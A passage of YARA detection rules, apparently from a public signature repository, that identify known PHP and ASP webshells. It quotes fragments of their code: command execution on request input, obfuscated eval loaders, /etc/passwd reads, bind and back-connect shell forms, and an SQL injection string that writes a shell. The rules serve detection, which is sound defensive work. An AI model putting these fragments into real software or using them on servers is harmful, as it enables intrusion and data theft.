		id = "c83bb4ba-6b4e-5a88-925b-b93d08b304e4"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5571-L5587"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1b2a4a7174ca170b4e3a8cdf4814c92695134c8a"
		logic_hash = "f93a5d87d4a490844de578067dc0b7bac6b01ceb9130cd7c70a227566e18f16c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
		$s4 = "$ps=str_replace(\"\\\\\",\"/\",getenv('DOCUMENT_ROOT'));" fullword
		$s5 = "header(\"Expires: \".date(\"r\",mktime(0,0,0,1,1,2030)));" fullword
		$s15 = "search_file($_POST['search'],urldecode($_POST['dir']));" fullword
		$s16 = "echo base64_decode($images[$_GET['pic']]);" fullword
		$s20 = "if (isset($_GET['rename_all'])) {" fullword

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_Simattacker {
    meta:
		description = "PHP Webshells Github Archive - file simattacker.php"
		author = "Florian Roth (Nextron Systems)"
		id = "2408fad8-780f-50de-a309-99d14a1d87b6"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5588-L5606"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "258297b62aeaf4650ce04642ad5f19be25ec29c9"
		logic_hash = "323b68f1d31df647775ad16a85b9f90bce4eac89188160a1e4853f8fec680160"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$from = rand (71,1020000000).\"@\".\"Attacker.com\";" fullword
		$s4 = "&nbsp;Turkish Hackers : WWW.ALTURKS.COM <br>" fullword
		$s5 = "&nbsp;Programer : SimAttacker - Edited By KingDefacer<br>" fullword
		$s6 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
		$s10 = "&nbsp;e-mail : kingdefacer@msn.com<br>" fullword
		$s17 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
		$s18 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
		$s20 = "$Comments=$_POST['Comments'];" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Dtool_Pro {
    meta:
		description = "PHP Webshells Github Archive - file DTool Pro.php"
		author = "Florian Roth (Nextron Systems)"
		id = "9f2922d1-b2af-58ae-b194-ecb33577effa"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5607-L5625"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "e2ee1c7ba7b05994f65710b7bbf935954f2c3353"
		logic_hash = "da744efb521415fb8817c0982d8d538e1e38b1c0995f43716611df37bf371c38"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "function PHPget(){inclVar(); if(confirm(\"O PHPget agora oferece uma lista pront"
		$s2 = "<font size=3>by r3v3ng4ns - revengans@gmail.com </font>" fullword
		$s3 = "function PHPwriter(){inclVar();var url=prompt(\"[ PHPwriter ] by r3v3ng4ns\\nDig"
		$s11 = "//Turns the 'ls' command more usefull, showing it as it looks in the shell" fullword
		$s13 = "if (@file_exists(\"/usr/bin/wget\")) $pro3=\"<i>wget</i> at /usr/bin/wget, \";" fullword
		$s14 = "//To keep the changes in the url, when using the 'GET' way to send php variables" fullword
		$s16 = "function PHPf(){inclVar();var o=prompt(\"[ PHPfilEditor ] by r3v3ng4ns\\nDigite "
		$s18 = "if(empty($fu)) $fu = @$_GET['fu'];" fullword

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_Ironshell_4 {
    meta:
		description = "PHP Webshells Github Archive - file ironshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "06e87e02-372b-5d4e-be52-5515a068665b"
		date = "2023-12-05"
		modified = "2023-12-05"
		old_rule_name = "WebShell_ironshell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5626-L5645"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d47b8ba98ea8061404defc6b3a30839c4444a262"
		logic_hash = "1810071f261ad7390532b07ef24115726f236131aa8ffd29adbde9ebe5085e9d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<title>'.getenv(\"HTTP_HOST\").' ~ Shell I</title>" fullword
		$s2 = "$link = mysql_connect($_POST['host'], $_POST['username'], $_POST"
		$s4 = "error_reporting(0); //If there is an error, we'll show it, k?" fullword
		$s8 = "print \"<form action=\\\"\".$me.\"?p=chmod&file=\".$content.\"&d"
		$s15 = "if(!is_numeric($_POST['timelimit']))" fullword
		$s16 = "if($_POST['chars'] == \"9999\")" fullword
		$s17 = "<option value=\\\"az\\\">a - zzzzz</option>" fullword
		$s18 = "print shell_exec($command);" fullword

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_Indexer_Asp_Php {
    meta:
		description = "PHP Webshells Github Archive - file indexer.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "d6e17429-1b58-5a1b-846d-f5dbfd74cf3a"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5646-L5662"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "e9a7aa5eb1fb228117dc85298c7d3ecd8e288a2d"
		logic_hash = "c576925c95b5bd2549e8039a1fc6ac228bfab5ddee8c4e12264ea78e9828ba5c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword
		$s1 = "<title>WwW.SaNaLTeRoR.OrG - inDEXER And ReaDer</title>" fullword
		$s2 = "<form action=\"?Gonder\" method=\"post\">" fullword
		$s4 = "<form action=\"?oku\" method=\"post\">" fullword
		$s7 = "var message=\"SaNaLTeRoR - " fullword
		$s8 = "nDexEr - Reader\"" fullword

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_Toolaspshell {
    meta:
		description = "PHP Webshells Github Archive - file toolaspshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "016af030-4991-583c-aab5-a2933ae0eeec"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5663-L5676"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "11d236b0d1c2da30828ffd2f393dd4c6a1022e3f"
		logic_hash = "cb46d3170a9c144a22ef8c91b381495a471d2aa178a4a123eb9a1e32e1db7683"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "cprthtml = \"<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDef"
		$s12 = "barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),\"\\\")) - 1" fullword
		$s20 = "destino3 = folderItem.path & \"\\index.asp\"" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_B374K_Mini_Shell_Php_Php {
    meta:
		description = "PHP Webshells Github Archive - file b374k-mini-shell-php.php.php"
		author = "Florian Roth (Nextron Systems)"
		id = "d5b0dfa5-46b5-5323-a8e8-b119d8c2c8e5"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5677-L5690"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "afb88635fbdd9ebe86b650cc220d3012a8c35143"
		logic_hash = "553bd775d9662f9410d9ab946ccffe4b2ee92e367bcc6345fa595527653280cf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@error_reporting(0);" fullword
		$s2 = "@eval(gzinflate(base64_decode($code)));" fullword
		$s3 = "@set_time_limit(0); " fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Sincap_1_0 {
    meta:
		description = "PHP Webshells Github Archive - file Sincap 1.0.php"
		author = "Florian Roth (Nextron Systems)"
		id = "38d39739-660f-596d-a297-1f0dfe530797"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5691-L5706"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "9b72635ff1410fa40c4e15513ae3a496d54f971c"
		logic_hash = "0cb8851285bd55b0b613ec4c46ab88142e2cbba7e527ad510b008cfb342af221"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "</font></span><a href=\"mailto:shopen@aventgrup.net\">" fullword
		$s5 = "<title>:: AventGrup ::.. - Sincap 1.0 | Session(Oturum) B" fullword
		$s9 = "</span>Avrasya Veri ve NetWork Teknolojileri Geli" fullword
		$s12 = "while (($ekinci=readdir ($sedat))){" fullword
		$s19 = "$deger2= \"$ich[$tampon4]\";" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_B374K_Php {
    meta:
		description = "PHP Webshells Github Archive - file b374k.php.php"
		author = "Florian Roth (Nextron Systems)"
		id = "73eb7d8d-14bb-5bc2-90b2-90b6bd603bd1"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5707-L5722"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "04c99efd187cf29dc4e5603c51be44170987bce2"
		logic_hash = "f44ecdcf327cf417a90a91c8d23f6137b80c2006bea2ca2e214f2bfdf5793771"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "// encrypt your password to md5 here http://kerinci.net/?x=decode" fullword
		$s6 = "// password (default is: b374k)"
		$s8 = "//******************************************************************************"
		$s9 = "// b374k 2.2" fullword
		$s10 = "eval(\"?>\".gzinflate(base64_decode("

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_Simattacker___Vrsion_1_0_0___Priv8_4_My_Friend {
    meta:
		description = "PHP Webshells Github Archive - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php"
		author = "Florian Roth (Nextron Systems)"
		id = "3e0bae7d-77a1-5439-bbe7-177bec23cea0"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5723-L5740"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "6454cc5ab73143d72cf0025a81bd1fe710351b44"
		logic_hash = "63ebb0c673a5aee05d2d9d571ebf63942d826b5148a5f7ed587ba1efbb0dc923"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "&nbsp;Iranian Hackers : WWW.SIMORGH-EV.COM <br>" fullword
		$s5 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
		$s10 = "<a style=\"TEXT-DECORATION: none\" href=\"http://www.simorgh-ev.com\">" fullword
		$s16 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
		$s17 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
		$s19 = "$Comments=$_POST['Comments'];" fullword
		$s20 = "Victim Mail :<br><input type='text' name='to' ><br>" fullword

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_H4Ntu_Shell__Powered_By_Tsoi_ {
    meta:
		description = "PHP Webshells Github Archive - file h4ntu shell [powered by tsoi].php"
		author = "Florian Roth (Nextron Systems)"
		id = "5a12a025-6497-545a-8da0-423ef448e374"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5741-L5757"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "cbca8cd000e705357e2a7e0cf8262678706f18f9"
		logic_hash = "da5994e3278278920d3e4774850d9b05f0244d2af03d0de92d1466f6f87ca3eb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s11 = "<title>h4ntu shell [powered by tsoi]</title>" fullword
		$s13 = "$cmd = $_POST['cmd'];" fullword
		$s16 = "$uname = posix_uname( );" fullword
		$s17 = "if(!$whoami)$whoami=exec(\"whoami\");" fullword
		$s18 = "echo \"<p><font size=2 face=Verdana><b>This Is The Server Information</b></font>"
		$s20 = "ob_end_clean();" fullword

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_Php_Webshells_Myshell {
    meta:
		description = "PHP Webshells Github Archive - file MyShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5758-L5776"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "42e283c594c4d061f80a18f5ade0717d3fb2f76d"
		logic_hash = "2c39ffecb44ce2f936ba3563c6086d8b2ed75aec3b57b45e2a1f5e7321ac9a3f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<title>MyShell error - Access Denied</title>" fullword
		$s4 = "$adminEmail = \"youremail@yourserver.com\";" fullword
		$s5 = "//A workdir has been asked for - we chdir to that dir." fullword
		$s6 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o"
		$s13 = "#$autoErrorTrap Enable automatic error traping if command returns error." fullword
		$s14 = "/* No work_dir - we chdir to $DOCUMENT_ROOT */" fullword
		$s19 = "#every command you excecute." fullword
		$s20 = "<form name=\"shell\" method=\"post\">" fullword

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_Php_Webshells_Pws {
    meta:
		description = "PHP Webshells Github Archive - file pws.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5777-L5793"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "7a405f1c179a84ff8ac09a42177a2bcd8a1a481b"
		logic_hash = "4b2eeb80200cc5dffa80cddc74f1902c0e8a5d2313d9a20d02eeb99ccb668ec0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "if ($_POST['cmd']){" fullword
		$s7 = "$cmd = $_POST['cmd'];" fullword
		$s10 = "echo \"FILE UPLOADED TO $dez\";" fullword
		$s11 = "if (file_exists($uploaded)) {" fullword
		$s12 = "copy($uploaded, $dez);" fullword
		$s17 = "passthru($cmd);" fullword

	condition:
		4 of them
}
rule SIGNATURE_BASE_Webshell_Reader_Asp_Php {
    meta:
		description = "PHP Webshells Github Archive - file reader.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "80ec18e1-6f41-5188-b2d5-f4228c975fa1"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5794-L5808"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "70656f3495e2b3ad391a77d5208eec0fb9e2d931"
		logic_hash = "6ffda38584b6cdec818af8e09c62bb4a46f40230ffd5c1a68993a91c37f67680"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "ster\" name=submit> </Font> &nbsp; &nbsp; &nbsp; <a href=mailto:mailbomb@hotmail"
		$s12 = " HACKING " fullword
		$s16 = "FONT-WEIGHT: bold; BACKGROUND: #ffffff url('images/cellpic1.gif'); TEXT-INDENT: "
		$s20 = "PADDING-RIGHT: 8px; PADDING-LEFT: 8px; FONT-WEIGHT: bold; FONT-SIZE: 11px; BACKG"

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_Safe_Mode_Bypass_PHP_4_4_2_And_PHP_5_1_2_3 {
    meta:
		description = "PHP Webshells Github Archive - file Safe_Mode_Bypass_PHP_4.4.2_and_PHP_5.1.2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "349cf6ac-92b3-59f7-a6e4-c23e69b454c6"
		date = "2023-12-05"
		modified = "2023-12-05"
		old_rule_name = "WebShell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5809-L5826"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "db076b7c80d2a5279cab2578aa19cb18aea92832"
		logic_hash = "6840af0d9f99277277edce93deb54e9a319c8938169701c89fdeb65207590951"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>" fullword
		$s6 = "by PHP Emperor<xb5@hotmail.com>" fullword
		$s9 = "\".htmlspecialchars($file).\" has been already loaded. PHP Emperor <xb5@hotmail."
		$s11 = "die(\"<FONT COLOR=\\\"RED\\\"><CENTER>Sorry... File" fullword
		$s15 = "if(empty($_GET['file'])){" fullword
		$s16 = "echo \"<head><title>Safe Mode Shell</title></head>\"; " fullword

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_Liz0Zim_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_2 {
    meta:
		description = "PHP Webshells Github Archive - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php"
		author = "Florian Roth (Nextron Systems)"
		id = "b647f529-be81-51ad-b671-84aec410e133"
		date = "2023-12-05"
		modified = "2023-12-05"
		old_rule_name = "WebShell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5827-L5843"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b2b797707e09c12ff5e632af84b394ad41a46fa4"
		logic_hash = "92bfac3516a448bbb3e78cf8950c6e816bf35d0ae2f3d32bc9b9b2836309999b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "$liz0zim=shell_exec($_POST[liz0]); " fullword
		$s6 = "$liz0=shell_exec($_POST[baba]); " fullword
		$s9 = "echo \"<b><font color=blue>Liz0ziM Private Safe Mode Command Execuriton Bypass E"
		$s12 = " :=) :</font><select size=\"1\" name=\"liz0\">" fullword
		$s13 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_PHP_Backdoor_2 {
    meta:
		description = "PHP Webshells Github Archive - file php-backdoor.php"
		author = "Florian Roth (Nextron Systems)"
		id = "65e1305b-4fc7-5885-b3df-92846bb57fe3"
		date = "2023-12-05"
		modified = "2023-12-05"
		old_rule_name = "WebShell_php_backdoor"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5844-L5860"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b190c03af4f3fb52adc20eb0f5d4d151020c74fe"
		logic_hash = "4228bcbfff5d7756615347196270f7916843e2aceacc7298610070b8b923381b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix" fullword
		$s6 = "// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombi"
		$s11 = "if(!isset($_REQUEST['dir'])) die('hey,specify directory!');" fullword
		$s13 = "else echo \"<a href='$PHP_SELF?f=$d/$dir'><font color=black>\";" fullword
		$s15 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Worse_Linux_Shell_2 {
    meta:
		description = "PHP Webshells Github Archive - file Worse Linux Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "04ed7464-29d1-54b9-98ff-afc03475b220"
		date = "2023-12-05"
		modified = "2023-12-05"
		old_rule_name = "WebShell_Worse_Linux_Shell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5861-L5878"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "64623ab1246bc8f7d256b25f244eb2b41f543e96"
		logic_hash = "6480c524213583511253ea1d37820994bba8a86f58a3775d4a9e4325725289d8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "if( $_POST['_act'] == \"Upload!\" ) {" fullword
		$s5 = "print \"<center><h1>#worst @dal.net</h1></center>\";" fullword
		$s7 = "print \"<center><h1>Linux Shells</h1></center>\";" fullword
		$s8 = "$currentCMD = \"ls -la\";" fullword
		$s14 = "print \"<tr><td><b>System type:</b></td><td>$UName</td></tr>\";" fullword
		$s19 = "$currentCMD = str_replace(\"\\\\\\\\\",\"\\\\\",$_POST['_cmd']);" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Php_Webshells_Phpinj {
    meta:
		description = "PHP Webshells Github Archive - file pHpINJ.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5879-L5896"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "75116bee1ab122861b155cc1ce45a112c28b9596"
		logic_hash = "271efaa8f370376f971d3d59256658b341599ac554cc216e09401e44b16bdede"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';" fullword
		$s10 = "<form action = \"<?php echo \"$_SERVER[PHP_SELF]\" ; ?>\" method = \"post\">" fullword
		$s11 = "$sql = \"0' UNION SELECT '0' , '<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 IN"
		$s13 = "Full server path to a writable file which will contain the Php Shell <br />" fullword
		$s14 = "$expurl= $url.\"?id=\".$sql ;" fullword
		$s15 = "<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />" fullword
		$s16 = "<input type = \"submit\" value = \"Create Exploit\"> <br /> <br />" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Php_Webshells_NGH {
    meta:
		description = "PHP Webshells Github Archive - file NGH.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5897-L5914"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c05b5deecfc6de972aa4652cb66da89cfb3e1645"
		logic_hash = "572b026545b012951136bdb9b1101e38f27bc3321b895799bc853ea1190877f9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<title>Webcommander at <?=$_SERVER[\"HTTP_HOST\"]?></title>" fullword
		$s2 = "/* Webcommander by Cr4sh_aka_RKL v0.3.9 NGH edition :p */" fullword
		$s5 = "<form action=<?=$script?>?act=bindshell method=POST>" fullword
		$s9 = "<form action=<?=$script?>?act=backconnect method=POST>" fullword
		$s11 = "<form action=<?=$script?>?act=mkdir method=POST>" fullword
		$s16 = "die(\"<font color=#DF0000>Login error</font>\");" fullword
		$s20 = "<b>Bind /bin/bash at port: </b><input type=text name=port size=8>" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Php_Webshells_Matamu {
    meta:
		description = "PHP Webshells Github Archive - file matamu.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L5915-L5931"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d477aae6bd2f288b578dbf05c1c46b3aaa474733"
		logic_hash = "c0101dab5fe7c3a2652b2e23e1ef0274364137895a402a0367c6b5474c0e8a1f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "$command .= ' -F';" fullword
		$s3 = "/* We try and match a cd command. */" fullword
		$s4 = "directory... Trust me - it works :-) */" fullword
		$s5 = "$command .= \" 1> $tmpfile 2>&1; \" ." fullword
		$s10 = "$new_dir = $regs[1]; // 'cd /something/...'" fullword
		$s16 = "/* The last / in work_dir were the first charecter." fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Ru24_Post_Sh {
    meta:
		description = "PHP Webshells Github Archive - file ru24_post_sh.php"
		author = "Florian Roth (Nextron Systems)"
		id = "86a45d72-c42d-58d5-9969-d3ebfc22853d"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
